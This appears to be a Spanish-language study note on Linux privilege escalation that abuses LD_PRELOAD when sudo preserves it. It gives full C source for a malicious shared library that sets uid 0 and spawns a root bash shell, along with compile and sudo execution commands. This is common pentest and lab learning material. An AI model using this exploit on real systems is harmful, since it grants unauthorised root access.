
Las **bibliotecas compartidas (`.so`)** contienen código que utilizan los programas durante su ejecución.

Existen dos tipos:
- **Estáticas (`.a`):** se incorporan al binario durante la compilación.
- **Dinámicas (`.so`):** se cargan durante la ejecución del programa.

Podemos aprovechar la carga de bibliotecas dinámicas para ejecutar código con privilegios elevados.

## 1. Enumeración

Ver las bibliotecas que utiliza un binario:

```bash
ldd /bin/ls
```

Comprobar los permisos de `sudo`:

```bash
sudo -l
```

Buscar configuraciones que permitan conservar `LD_PRELOAD`:

```text
env_keep+=LD_PRELOAD
```

**Si aparece esta configuración y podemos ejecutar un programa como root mediante sudo, podría ser posible escalar privilegios.**

## 2. Escalada mediante LD_PRELOAD

`LD_PRELOAD` permite cargar una biblioteca compartida antes que las bibliotecas normales de un programa.

Si `sudo` conserva esta variable, podemos cargar una biblioteca personalizada con privilegios de root.

### Crear biblioteca maliciosa

Archivo `root.c`:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

### Compilar

```bash
gcc -fPIC -shared -o root.so root.c -nostartfiles
```

- `-fPIC`: genera código independiente de la posición de memoria.
- `-shared`: crea una biblioteca compartida (`.so`).
- `-nostartfiles`: evita incluir los archivos de inicio habituales.

### Ejecutar

Si `sudo -l` permite ejecutar `/usr/sbin/apache2 restart` como root:

```bash
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

La biblioteca se carga antes de ejecutar Apache y su función `_init()` abre una shell con privilegios de root.

Comprobar:

```bash
id
whoami
```

## Puntos importantes

- `LD_PRELOAD` permite cargar código personalizado antes de ejecutar un programa.
- Buscar `env_keep+=LD_PRELOAD` en `sudo -l`.
- Necesitamos un comando permitido mediante `sudo` que cargue bibliotecas dinámicas.
- La biblioteca debe compilarse como `.so`.
- No es necesario que el comando permitido sea un GTFOBin.
- La técnica depende de que `sudo` permita conservar y utilizar `LD_PRELOAD`.
